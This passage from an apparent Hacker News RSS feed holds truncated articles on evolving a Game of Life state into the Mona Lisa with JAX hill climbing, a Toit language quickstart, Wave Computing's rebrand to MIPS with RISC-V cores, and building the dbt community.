March 5, 2021 | https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html | <a href="https://web.archive.org/web/*/https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/lisa.webm" type="video/webm"> </video>

<cap>This video might take a few seconds to load. Please squint for best results :).</cap>

<p>The results of this experiment are not exactly close to my target as you can see, but I thought it was worth a blog post anyway. There was this rough idea I’ve been thinking about in <a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life">Conway’s Game of Life</a> for a really long time.</p>

<blockquote data-conversation="none"><p lang="en" dir="ltr">I wonder if it's possible to use some kind of stochastic algorithm that gives you an initial state which forms legible text after many cycles.</p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1291586306489761792?ref_src=twsrc%5Etfw">August 7, 2020</a></blockquote>


<p>I came across <a href="https://kevingal.com/blog/mona-lisa-gol.html">an article</a> of the same title by Kevin Galligan recently and I thought I could do something similar using a different approach. What if instead of using SAT Solvers, I use some kind of heuristic algorithm that could somehow “program” a large world of Game of Life to display an image after a few generations?</p>

<p>There are other ways of achieving this. One is by placing still life states at specific pixels as described in this <a href="https://codegolf.stackexchange.com/questions/38573/paint-a-still-life-or-a-moving-one-draw-an-image-in-the-game-of-life">codegolf question</a>.</p>

<p>What I’m thinking of is to display Mona Lisa for a single frame/generation of ‘non-still’ Game of Life.</p>



<p>I began working on a proof of concept using the hill climbing algorithm. The idea was very simple. Iteratively modify a random 2D Game of Life state until it’s Nth generation looks similar to Mona Lisa. Here’s the full algorithm.</p>

<div><div><pre><code>    best_score := infinity
    target := mona lisa with dimensions m x n
    canvas := random matrix of m x n
    best_result := canvas
    do
        modified_canvas := Copy of canvas with a single random cell inverted
        nth_modified_canvas := Run N generations of Game of Life modified_canvas
        Compute a score of how close nth_modified_canvas is with target
        if score &lt; best_score then
        	best_score := score
            best_result := modified_canvas
        canvas := best_result
    while(max_iterations limit passed or best_score &lt; threshold)
</code></pre></div></div>

<p>I hacked up a single core prototype.</p>

<div><div><pre><code>def modify(canvas, shape):
    x,y = shape
    px = int(np.random.uniform(x+1))-1
    py = int(np.random.uniform(y+1))-1
    canvas[px][py] = not canvas[px][py]
    return canvas

def rmse(predictions,targets):
    return np.sqrt(np.mean((predictions-targets)**2))

while best_score&gt;limit:
    canvases = np.tile(np.copy(best_seed), (batch_size, 1, 1))
    rms_errors = []
    for canvas in range(len(canvases)):
        canvases[canvas] = modify(states[state], (m,n))
        rmse_val = rmse(target, nth_generation(np.copy(canvases[canvas])))
        rms_errors.append(rmse_val)
    lowest = min(rms_errors)
    if lowest &lt; best_score:
        best_score = lowest
        best_result = canvases[rms_errors.index(lowest)]
</code></pre></div></div>

<p>Hill Climbing works by finding the closest neighboring state to a current state with the least error from a ‘target_state’ (Mona Lisa). The way I find the closest neighbor in every step is to create a copy of the best solution we have so far and invert a random cell. This change is small enough that we don’t risk stepping over any local minima. Also we use root mean square error metric to compare the best state and the target. Other error metrics can be experimented with, but for this problem, I found that RMSE was sufficient.</p>

<p>After a few days of CPU time(!), I was able to obtain something that resembled Mona Lisa after running 4 generations of life.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/lisa_cpu.webm" type="video/mp4"> </video>

<p>It was reassuring that my algorithm did indeed work, but I realize I made a bunch of mistakes and of course it’s not really scalable for larger images or fast.</p>



<p>Target Mona Lisa against which our random state was compared with was the medium resolution version taken from Wikipedia and converted to monochrome using PIL’s <code>Image.open('target.png').convert('L')</code></p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-38-08-copy.png" alt=""></p>

<cap><a href="https://en.wikipedia.org/wiki/Mona_Lisa#/media/File:Mona_Lisa,_by_Leonardo_da_Vinci,_from_C2RMF_retouched.jpg">Taken from wikipedia</a></cap>

<p>When you’re comparing against boolean variables, It’s better that we the target as a binary matrix rather than the whole grayscale range.</p>

<p>In this attempt, I simply rounded these grayscale values to 0s and 1s. This was a mistake as it washed away a lot of details.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-39-11.png" alt=""></p>

<p>We could just not round at all and compare against the grayscale version, but there is a better way.</p>



<p>Not every random matrix of 0s and 1s are a valid Game of Life state. States that can never be an nth generation (n&gt;0) of any Cellular Automata are called Garden of Edens. It is almost impossible that our monochrome-rounded Mona Lisa is a valid Game of Life generation. We can only hope to have a solution that’s approximately close to the target.</p>

<p>This is a portion of the 4th generation of the state we just prepared.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-19-08-47.png" alt=""></p>

<p>Judging by the texture, the way life patterns evolve and from just experimenting with images, I found that comparing against a 1-bit dithered version the target should improve the quality of results.</p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-19-04-26.png" alt=""></p>

<cap>1-bit Dithering on Mona Lisa</cap>

<p>Dithered image has a somewhat even distribution of 0 and 1 cells which is somewhat close to what a randomly initialized Game of Life state will look like after a few generations. This property is also maintained when you scale up the image, (which we’ll optimize for soon).</p>

<p>We could do this using PIL (it’s <a href="https://en.wikipedia.org/wiki/Floyd%E2%80%93Steinberg_dithering">Floyd–Steinberg dithering</a>) using <code>Image.open('target.png').convert('1')</code></p>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-02-23-18-54-34.png" alt=""></p>

<p>Also you can see from the last result, it’s impossible to get a continuous array of white cells because they will be killed off by the overpopulation rule. Completely dark areas are stable in life. The end result will be a higher contrast, but slightly darkened version of Mona Lisa. At higher resolutions, this effect is not as apparent.</p>



<p>The single core unvectorized version is extremely slow. I tried running this in both my 8th gen Core i7 and the Google Colab CPU machines, but you need to wait for hours/days (depending on target resolution) to get something that resembles the original.</p>

<p>Fortunately, This problem is well suited for parallelization.</p>

<p><img src="https://raw.githubusercontent.com/google/jax/master/images/jax_logo_250px.png" alt=""></p>

<p>JAX is a python library that lets you use a version of numpy and compile it to highly vectorized code that can be run on a GPU/TPU. We need to rework this algorithm for a GPU.</p>

<p>GPUs generally suited to high-throughput type computations that has good data-parallelism. We need to exploit the SIMD (Single Instruction Multiple Data) architecture to gain faster execution speeds.</p>

<p>We extrude the <code>target</code>(Mona Lisa) and <code>canvas</code>(initial random state) to 3rd dimension with 3rd dimension being <code>batch_size</code> long tensor loafs (Consider a loaf of bread, with each slice being dithered Mona Lisa).</p>

<p><img src="https://avinayak.github.io/uploads/untssitled-another-copy.png" alt=""></p>

<p><img src="https://avinayak.github.io/uploads/untssitled-copy.png" alt=""></p>
<cap>Initial canvas will be completely random(unlike the figure).</cap>

<p>We set <code>best_canvas</code> to the initial random canvas before our hill climbing loop.</p>

<p>Also, for every loop iteration, we need to produce a random tensor called mutator(same shape as <code>target</code>) with this property: Each slice should have all zeros except a single one place at a random location.</p>

<p><img src="https://avinayak.github.io/uploads/untssitled-3rd-copy.png" alt=""></p>

<p>Something like</p>

<div><div><pre><code>array([[[1, 0],
        [0, 0],
        [0, 0]],

       [[1, 0],
        [0, 0],
        [0, 0]],

       [[0, 0],
        [0, 1],
        [0, 0]],

       [[0, 1],
        [0, 0],
        [0, 0]],

       [[1, 0],
        [0, 0],
        [0, 0]]])
</code></pre></div></div>

<cap><br>Example mutator with shape 5, 3, 2. batch_size being 5</cap>

<p>The idea is that in every loop, we use the mutator to calculate the nearest set of neighboring states from our best_canvas like this <code>canvas = (best_canvas + mutator)%2</code>.</p>

<p>We compute N generations of game of life across every slice of this modified canvas. Then, we do a 3D RMSE(mean being calculated for the slice only) on the Nth generation canvas against Mona Lisa, and find the slice with the lowest error.
This is slice is then extruded and set to best_canvas and the loop repeats till a finite number of iterations pass.</p>

<h2 id="code">Code</h2>

<p>The notebook for this project is <a href="https://github.com/avinayak/mona_lisa_gol_jax/blob/main/mona_lisa_overdrive.ipynb">available in github</a>. I’ll explain what every block is doing in this section. If you want to see results, skip to the end of the article.</p>

<p>The core of this project, the game of life function is actually taken from <a href="http://www.bnikolic.co.uk/blog/python/jax/2020/04/19/game-of-life-jax.html">this post</a>. Thank you  Bojan Nikolic :). I followed his convention of importing <code>jax.numpy</code> as <code>N</code>, <code>jax.lax</code> as <code>L</code>.</p>

<div><div><pre><code>%matplotlib inline 
import jax
N=jax.numpy
L=jax.lax
from jax.experimental import loops
from jax import ops
import matplotlib.pyplot as plt
import numpy as onp
import time
from PIL import Image 
from google.colab import files
</code></pre></div></div>

<p>Next, <code>wget</code> Mona Lisa</p>

<div><div><pre><code>!wget -O target.png https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Mona_Lisa%2C_by_Leonardo_da_Vinci%2C_from_C2RMF_retouched.jpg/483px-Mona_Lisa%2C_by_Leonardo_da_Vinci%2C_from_C2RMF_retouched.jpg?download
</code></pre></div></div>

<p>This is not a crazy high res version.It’s only 483px wide.</p>

<div><div><pre><code>batch_size = 100
image_file = Image.open("target.png")
image_file = image_file.convert('1')
lisa = N.array(image_file, dtype=N.int32)
width,height = lisa.shape
lisa_loaf = onp.repeat(lisa[onp.newaxis, :, :,], batch_size, axis = 0)
</code></pre></div></div>

<p>This section dithers Mona Lisa using the and extrudes it to <code>batch_size</code> length.</p>

<div><div><pre><code>key = jax.random.PRNGKey(42)
canvas_loaf = jax.random.randint(key, (batch_size, width, height), 0, 2, dtype= N.int32) #for tests, initialize random lisa
</code></pre></div></div>

<p>Here, we’re seeding JAX PRNG(will be explained soon). Also we’re creating the initial random <code>canvas_loaf</code> with integers 0 and 1.</p>

<div><div><pre><code>@jax.jit
def rgen(a):
    # This reduction over-counts the neighbours of live cells since it includes the
    # central cell itself. Subtract out the array to correct for this.
    nghbrs=L.reduce_window(a, 0, L.add, (3,3), (1,1), "SAME")-a
    birth=N.logical_and(a==0, nghbrs==3)
    underpop=N.logical_and(a==1, nghbrs&lt;2)
    overpop=N.logical_and(a==1, nghbrs&gt;3)
    death=N.logical_or(underpop, overpop)

    na=L.select(birth,
                N.ones(a.shape, N.int32),
                a)

    na=L.select(death,
                N.zeros(a.shape, N.int32),
                na)
    return na

vectorized_rgen = jax.vmap(rgen)

@jax.jit
def nv_rgen(state):
  for _ in range(n_generations):
      state = vectorized_rgen(state)
  return state
</code></pre></div></div>

<p>Please read <a href="http://www.bnikolic.co.uk/blog/python/jax/2020/04/19/game-of-life-jax.html">B. Nikolc’s post</a> for an explanation for <code>rgen</code> function, which runs a single generation of Game of Life.</p>

<p><code>jax.vmap</code> lets us creates a function which maps an input function over …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html">https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html</a></em></p>]]>
            </description>
            <link>https://avinayak.github.io/algorithms/programming/2021/02/19/finding-mona-lisa-in-the-game-of-life.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26365806</guid>
            <pubDate>Sat, 06 Mar 2021 07:24:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Toit Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 15 (<a href="https://news.ycombinator.com/item?id=26365202">thread link</a>) | @azhenley
<br/>
March 5, 2021 | https://docs.toit.io/language/language/ | <a href="https://web.archive.org/web/*/https://docs.toit.io/language/language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
      
        
      
      
        
      
      <main data-md-component="main">
        <div>
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                
                  
                
                
                
<p>This quickstart guide is inspired by <a href="https://www.ruby-lang.org/en/documentation/quickstart/">Ruby in Twenty Minutes</a>. It makes the assumption that you already have <a href="https://docs.toit.io/installation/toitcli/">Toit installed</a> on your machine.</p>
<p>Toit is an object-oriented programming language for the internet of things. The Toit language has the following desirable properties:</p>
<ul>
<li>Modern, simple, and approachable</li>
<li>High-level and object-oriented</li>
<li>Declarative and statically analyzable</li>
<li>Safe and garbage collected</li>
</ul>
<p>Now, let's get started with some programming!</p>
<h2 id="hello_world">Hello, World<a href="#hello_world" title="Permanent link">#</a></h2>
<p>A local installation of Toit comes with support for running small programs directly from the command line. If you put the following code in a file called <code>hello.toit</code></p>


<p>you can run it from the command line like this:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
</code></pre></div>

<p>What just happened? The <code>toit</code> command line tool read your source code (<code>hello.toit</code>) and started running it from the <code>main</code> method that you defined. The <code>main</code> method consists of all the indented statements just below the method declaration line <code>main:</code>. Toit is indentation-based like Python, so the spaces you add to your programs are significant.</p>
<p>Once the program ran, it printed <code>Hello World!</code> in your terminal. This is because the only statement in <code>hello.toit</code> is a method call, where you invoke the <code>log</code> method with a single argument, which is the string to be logged (in this case, printed to the terminal). If you wanted to output more than one line from your program, you could update it to:</p>
<div>
<div><pre><span></span><code>main:
  log "Hello World!"
  log "Hello World!"
</code></pre></div>
</div>

<p>When you run the updated program, you will see two lines of output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Hello World!
</code></pre></div>

<h2 id="defining_a_method">Defining a method<a href="#defining_a_method" title="Permanent link">#</a></h2>
<p>What if you want to say "Hello" a lot without getting your fingers all tired? You should define another method:</p>


<p>and call that from <code>main</code>:</p>


<p>Calling a method in Toit is as simple as mentioning its name. If the method doesn’t take arguments that’s all you need.</p>
<p>What if we want to say hello to one person, and not the whole world? Just redefine hi to take a name as an argument.</p>
<div>
<div><pre><span></span><code>hi name:
  log "Hello $name!"
</code></pre></div>
</div>

<p>This way, <code>hi</code> is a method that takes a single argument. We can use that from <code>main</code>:</p>
<div>
<div><pre><span></span><code>main:
  hi "Lars"
  hi "Kasper"
</code></pre></div>
</div>

<p>and it works!</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello Lars!
Hello Kasper!
</code></pre></div>

<h2 id="inserting_strings_in_strings">Inserting strings in strings<a href="#inserting_strings_in_strings" title="Permanent link">#</a></h2>
<p>What’s the <code>$name</code> bit? That’s Toit's way of inserting something into a string. It is called <em>string interpolation</em>. The bit after the <code>$</code> is turned into a string (if it isn’t one already) and then substituted into the outer string at that point. You can also use this to make sure that someone’s name is properly trimmed so leading and trailing whitespace is ignored:</p>
<div>
<div><pre><span></span><code>hi name = "World":
  log "Hello, $name.trim!"
</code></pre></div>
</div>

<p>This way, we call the <code>trim</code> method on the <code>name</code> string before we insert it into the outer string. If we call <code>hi "   Lars  "</code> we still get the familiar greeting <code>Hello Lars!</code> and not <code>Hello   Lars  !</code>. You can add parentheses around the <code>name.trim</code> expression in the string to make it clearer which parts belong to the outer string:</p>
<div><pre><span></span><code>  log "Hello, $(name.trim)!"
</code></pre></div>

<p>Maybe you already spotted that we went ahead and added one other trick to the code above? We added a default value for the <code>name</code> parameter, so if the name isn’t supplied when you call <code>hi</code>, we use the default name "World". Now we can try:</p>


<p>and get the following output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Hello Kasper!
</code></pre></div>

<h2 id="evolving_into_a_greeter">Evolving into a greeter<a href="#evolving_into_a_greeter" title="Permanent link">#</a></h2>
<p>What if we want a real greeter around, one that remembers your name and welcomes you and treats you with respect. You might want to use an object for that. Let’s create a <code>Greeter</code> class:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name := null

  constructor .name = "World":

  say_hi: log "Hi $name.trim!"

  say_bye: log "Bye $name.trim, come back soon."
</code></pre></div>
</div>

<p>The new keyword here is <code>class</code>. This defines a new class called <code>Greeter</code> and a bunch of methods for that class. Pay special attention to the method <code>constructor</code>. There is nothing after the <code>:</code> and the <code>constructor</code> method isn’t followed by any indented lines, so the constructor has no statements in it:</p>
<div><pre><span></span><code>  constructor .name = "World":
</code></pre></div>

<p>This is a constructor and it defines how you can construct objects from the class. It says the class <code>Greeter</code> takes a single argument (<code>name</code>), but the <code>.</code> prefix to the <code>.name</code> parameter actually tells us that the name is immediately stored as a field on <code>Greeter</code> objects. The field is defined just above the constructor with the <code>:=</code> syntax.</p>
<p>The field parameter <code>.name</code> still has a default value, so if we don’t pass a name, the <code>Greeter</code> will greet the world.</p>
<p>The <code>say_hi</code> and <code>say_bye</code> methods are introduced on the next two lines. The methods both have a single statement in them, so we can keep them on one line each. The <code>say_hi</code> and <code>say_bye</code> method both use the <code>name</code> field from the object they are called on. You can refer to fields in the class of a method simply by mentioning them (<code>name</code>).</p>
<h2 id="creating_a_greeter_object">Creating a greeter object<a href="#creating_a_greeter_object" title="Permanent link">#</a></h2>
<p>Now let’s create a greeter object and use it:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Helena "
  greeter.say_hi
  greeter.say_bye
</code></pre></div>
</div>

<p>We create an object simply by mentioning the constructor, <code>Greeter</code>. The greeter object remembers the name and uses it for the two separate greetings. If we run this, we get the following output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hi Helena!
Bye Helena, come back soon.
</code></pre></div>

<p>If you want to get the name from a greeter, you can ask a greeter by calling the <code>name</code> method on it:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Helena "
  log "How are you $(greeter.name)?"
</code></pre></div>
</div>

<p>This would show <code>How are you  Helena ?</code>. Almost neat, right? Unfortunately, the name isn’t trimmed like we expected. Let’s fix that!</p>
<h2 id="fields_and_methods">Fields and methods<a href="#fields_and_methods" title="Permanent link">#</a></h2>
<p>As you have just seen, a field on an object introduces a method with the same name. If you wanted to hide a field from the outside world, you could make it private. By convention, methods and fields that end with an underscore (<code>_</code>) are private and not supposed to be touched from the outside:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_:= null
  constructor .name_ = "World":
</code></pre></div>
</div>

<p>This removes the <code>name</code> method from greeters, but if we really want to allow accessing the name from the outside, we could reintroduce a getter with the same meaning as before.</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_ := null

  constructor .name_ = "World":

  name: return name_
  say_hi: log "Hi $name_.trim!"
  say_bye: log "Bye $name_.trim, come back soon."
</code></pre></div>
</div>

<p>Here we use the new keyword <code>return</code> to specify the value a method returns. We could make it slightly more interesting and trim it in the process:</p>


<p>In this way, access to the name from the outside also gets the trimming and we can avoid repeating the call to <code>trim</code>:</p>
<div>
<div><pre><span></span><code>class Greeter:
  name_ := null

  constructor .name_ = "World":

  name: return name_.trim
  say_hi: log "Hi $name!"
  say_bye: log "Bye $name, come back soon."
</code></pre></div>
</div>

<p>We can check that it works by running:</p>
<div>
<div><pre><span></span><code>main:
  greeter := Greeter " Erik "
  log "How are you $(greeter.name)?"
</code></pre></div>
</div>

<p>and you should see <code>How are you Erik?</code>. Inside <code>main</code>, we store the greeter in a local variable (<code>greeter</code>) so we can keep referring to the same object. You can think of it as a way to give a specific object a name that is only valid and useful inside the <code>main</code> method.</p>
<p>Just like introducing a member variable, we can use the <code>:=</code> syntax in methods and functions like <code>main</code> to introduce local variables.</p>
<h2 id="greetings_everyone">Greetings everyone!<a href="#greetings_everyone" title="Permanent link">#</a></h2>
<p>This greeter isn’t all that interesting though, it can only deal with one person at a time. What if we had some kind of MegaGreeter that could either greet the world, one person, or a whole list of people? Let’s try to build that. We will start with a class definition:</p>
<div>
<div><pre><span></span><code>class MegaGreeter:
  names := []

  constructor name = "World":
    names.add name
</code></pre></div>
</div>

<p>So MegaGreeter objects have a list of <code>names</code>. The <code>names</code> field is initialized to the empty list (<code>[]</code>). The body of the <code>MegaGreeter</code> constructor adds the given <code>name</code> argument to the end of the list of names. Notice that this is different than using a <code>.name</code> parameter that automatically assigns to the field called <code>name</code>. Mega greeters don't have a single name and no <code>name</code> field, so here the <code>name</code> is just an ordinary parameter that we can use in the body of the constructor. All in all, this code:</p>
<div>
<div><pre><span></span><code>main:
  greeter := MegaGreeter
  log "The names are $greeter.names"
</code></pre></div>
</div>

<p>will lead to this output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
The names are ["World"]
</code></pre></div>

<p>We can now go ahead and add greeter methods that show all the names:</p>
<div>
<div><pre><span></span><code>// Greeter that says hi to everybody.
class MegaGreeter:
  names := []

  constructor name = "World":
    names.add name

  say_hi:
    // Greet everyone individually!
    names.do: log "Hello $it!"
  say_bye:
    everyone := names.join ", "
    log "Bye $everyone, come back soon."

main:
  greeter := MegaGreeter
  greeter.say_hi
  greeter.say_bye

  greeter.names.add "Lars"
  greeter.names.add "Kasper"
  greeter.names.add "Rikke"
  greeter.say_hi
  greeter.say_bye
</code></pre></div>
</div>

<p>If you run this, you’ll get this output:</p>
<div><pre><span></span><code>$ toit execute hello.toit
Hello World!
Bye World, come back soon.
Hello World!
Hello Lars!
Hello Kasper!
Hello Rikke!
Bye World, Lars, Kasper, Rikke, come back soon.
</code></pre></div>

<p>Let’s dive into the new constructs in the next sections.</p>

<p>Not everything in your source files is meant to be run by the Toit compiler. Sometimes, it is nice just to add comments that explain interesting things related to your code. In the example in the last section, there were a few single line comments:</p>
<div>
<div><pre><span></span><code>// Greeter that says hi to everybody.
class MegaGreeter:
</code></pre></div>
</div>

<p>Such comments start with <code>//</code> and tell the system to ignore the rest of the line.</p>
<p>You have already seen the use of indentation to give hierarchical structure to your code. The general structure is that after a <code>:</code> you can have a single construct if it fits on one line:</p>


<p>or you can add a newline after the <code>:</code> and let the following lines that are indented relative to the outer construct …</p></article></div></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://docs.toit.io/language/language/">https://docs.toit.io/language/language/</a></em></p>]]>
            </description>
            <link>https://docs.toit.io/language/language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26365202</guid>
            <pubDate>Sat, 06 Mar 2021 04:27:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Wave Computing Rebrands to MIPS, Embraces RISC-V for Next-Gen Cores]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26364117">thread link</a>) | @brucehoult
<br/>
March 5, 2021 | https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/ | <a href="https://web.archive.org/web/*/https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><b>Wave Computing has emerged from bankruptcy proceedings with the surprise news that it’s taking the name of its MIPS subsidiary and moving to the free and open-source RISC-V ISA for future processor IP.<br>
</b></p>
<p>Wave Computing <a href="https://abopen.com/news/wave-computing-announces-mips-open-initiative/">dipped its toes in the free and open-source silicon movement back in 2018</a>, announcing that its subsidiary MIPS Tech, acquired from Imagination Technologies in June that year, would provide 32- and 64-bit versions of the MIPS instruction set architecture (ISA) and full licences to its MIPS-related patent portfolio free of licensing fees and royalty payments. “We invite the worldwide community to join us in this exciting journey,” MIPS IP president Art Swift said at the time, “and look forward to seeing the many MIPS-based innovations that result.”</p>
<p>In March 2019 <a href="https://abopen.com/news/wave-computing-announces-first-mips-open-release/">the first MIPS Open IP hit the market</a>, but seven months later <a href="https://abopen.com/news/wave-computing-shutters-mips-open-programme-with-immediate-effect/">the MIPS Open initiative shuttered with immediate effect</a>. The decision seemed inexplicable – until Wave Computing filed for Chapter 11 bankruptcy protection in April last year, unveiling financial troubles.</p>
<p>Now, that process is complete – and Wave Computing is back, but under a new name: Wave Computing is now MIPS, and is to push forward with a focus on its processor IP. That focus, interestingly, includes a move away from its in-house MIPS ISA for future designs: instead, the company’s eighth-generation cores will be based on the free and open-source RISC-V architecture with which Wave Computing’s MIPS Open had hoped to compete.</p>
<p>The reborn MIPS has not yet indicated whether it plans to release its eighth-generation IP under open terms or to keep it proprietary.</p>

        </div></div>]]>
            </description>
            <link>https://abopen.com/news/wave-computing-rebrands-to-mips-risc-v/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26364117</guid>
            <pubDate>Sat, 06 Mar 2021 00:40:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Build a Community: Starting with “Why?”]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 32 (<a href="https://news.ycombinator.com/item?id=26363709">thread link</a>) | @alexdean
<br/>
March 5, 2021 | https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html | <a href="https://web.archive.org/web/*/https://clrcrl.com/2021/03/03/how-to-build-a-community-why.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <h2 id="my-origin-story">My origin story</h2>

<p>In November 2018, I moved from Sydney to the US to take on a role managing the dbt community. I’d been a member of the community for the two years prior, and in that time had gone from a data analyst who knew enough SQL to be dangerous, to someone who understood the data space deeply enough that I wanted a new challenge. And I’d learned almost everything about data from the dbt community.</p>

<p>Over the last few years, the dbt community has been incredibly successful — since I started, we’ve grown from 1000 members to over 10 000. In December, we hosted a conference that had 5 000 registrants, and received incredibly positive feedback. Late last year, when our eventual Series-B investors reached out to a dozen community members and asked for their NPS, we received an average score of 10.2/10 — no, this is not a typo, apparently someone gave us as 12/10. (If this was you: you should know better as a data person! You’re really messing up my numbers here!). Most of these community members cited the community as a reason for their high score.</p>

<p>Finally, around once a week I get around one DM a week saying thanks for everything we’ve built!</p>

<p><img src="https://clrcrl.com/assets/img/posts/tickled-pink.png"></p>



<p>If you had asked me when I joined in November 2018 what our community would look like at 10k members, I would have guessed that it would have become like most other online communities: full of unkind people and extractive behavior (after all, <a href="http://blog.vickiboykis.com/2017/05/10/good-things-don't-scale/">good things don’t scale</a>). I would have been scared of that day.</p>

<p>Yet somehow, despite my worst fears of growth (or perhaps because of them), people still find being a part of the dbt community to be a net-positive experience. Sure, it’s not perfect, but it’s still pretty good!</p>

<p>As a result, other companies in the industry are noticing, leading to a number of “can I pick your brain?” meeting requests¹ over the past few months. Most days, I feel wholly unqualified to give an opinion on why, or how, we’ve been so successful, I’ve just been making it up as I go along. But when I look at what we’ve achieved, when I talk to new starters at our company, or when I <em>do</em> let someone pick my brain, I realise that I do know <em>something</em> about this whole community building thing, and perhaps that thing is worth writing about.</p>

<p>So, this is the first of who-knows-how-many posts on <em>How to Build a Community</em>.</p>



<p>Often folks end up in my inbox because their CEO has heard that community building is the latest hotness, and they’re scrambling to figure out what that means, and how they should do this.</p>

<p>My first question is always “why do you want to build a community?”. Here’s some common answers:</p>
<ul>
  <li>“Well, it must be fantastic at increasing your top of funnel for sales and marketing.”</li>
  <li>“It just feels like your community creates incredible hype around your product.”</li>
  <li>“I guess we’ll be able to understand our users’ needs better, and get more product feedback.”</li>
  <li>“After all, you get free content, and get to outsource a ton of other work.”</li>
</ul>

<p>These are pretty reasonable answers on the surface, especially if you’re looking at our community as a model of success — after all, we do in fact get all of these benefits.</p>

<p>But if these are the primary motivators for <em>why</em> you’re building a community, I’m skeptical that you’ll succeed. These reasons put the benefit of the company ahead of the community member, and I’m pretty sure that any of our community members would see right through these motivations.</p>

<h2 id="building-mission-driven-communities">Building mission-driven communities</h2>

<p>So if those answers aren’t quite right, what <em>is</em> a good answer? Here’s my two step process to identifying why community might be right for you:</p>

<ol>
  <li>Find for your company mission, and</li>
  <li>Ask yourself “does building a community help us achieve this mission?”. If yes, then that’s your “why”.</li>
</ol>

<p>Let’s take the mission of the company I work for, Fishtown Analytics, as an example:</p>
<blockquote>
  <p>Fishtown Analytics is on a mission to empower analysts.</p>
</blockquote>

<p>(OK there’s actually a little bit more in the mission, but this is the part that I like most).</p>

<p>Another great example is <a href="https://www.animalz.co/about/">Animalz</a>:</p>
<blockquote>
  <p><strong>Set a new bar for quality content marketing</strong>. <br> We envision a world where the internet is dominated by content that’s informative, insightful and entertaining.</p>
</blockquote>

<p>In both of these examples, it’s so clear that community is a tool for the company to achieve this mission — yes, a company can provide software and services in pursuit of this mission, but to <em>really</em> achieve it, one needs to be thinking bigger than this.</p>

<h2 id="how-does-this-play-out">How does this play out?</h2>

<p>For the last two and a half years, I’ve approached community-management from the perspective of trying to achieve our mission of empowering more analysts. Often, this leads us to make decisions that look different to other companies in our space.</p>

<ul>
  <li>On creating events:
    <ul>
      <li><strong>Other companies:</strong> I recently saw the info sheet for an event that a vendor wanted us to participate in. At the top of the sheet was the goal for the event: “Create $X of sales opportunities”. Most of the talks were a thinly-veiled sales pitch for their product. I didn’t feel like I’d learned anything by attending, and I won’t be attending next year.</li>
      <li><strong>My take:</strong> When planning our inaugural conference, Coalesce, our goal was to create an event that advanced the practice of analytics engineering. When selecting talks, we chose the ones that we felt helped data teams be more impactful.</li>
    </ul>
  </li>
</ul>



<ul>
  <li>On speaking at conferences:
    <ul>
      <li><strong>Other companies:</strong> It’s not uncommon to have Developer Advocates whose role it is to speak at conferences.</li>
      <li><strong>My take:</strong> In comparison, I prefer to work with our community members so that they give the best conference talks possible (note: I have spoken at the odd-conference here and there – it’s a great way for to make sure that I’m well placed to give community members advice on how to make talks great!).</li>
    </ul>
  </li>
</ul>



<ul>
  <li>On getting product feedback:
    <ul>
      <li><strong>Other companies:</strong> If I had an Amazon gift card for every time a company sent me an email asking me to do a product survey (in exchange for… an Amazon gift card). Some times, it’s up to the community team to bring feedback back to the company.</li>
      <li><strong>My take:</strong> I think more about how I can bring our team <em>into</em> the community — I’m very lucky in that all of our product team are data people themselves, so have a shared context with our community. But even our non-data teammates are building connections in the community — everyone on our team is great at what they do, and our community members often enjoy getting the chance to speak to a fantastic product designer and learn from them.</li>
    </ul>
  </li>
</ul>



<ul>
  <li>On recognizing community members:
    <ul>
      <li><strong>Other companies:</strong> Ever been to a conference that had a points system for swag? Or seen a community that had a leaderboard? In these cases a company is trying to incentivize someone to give them something.</li>
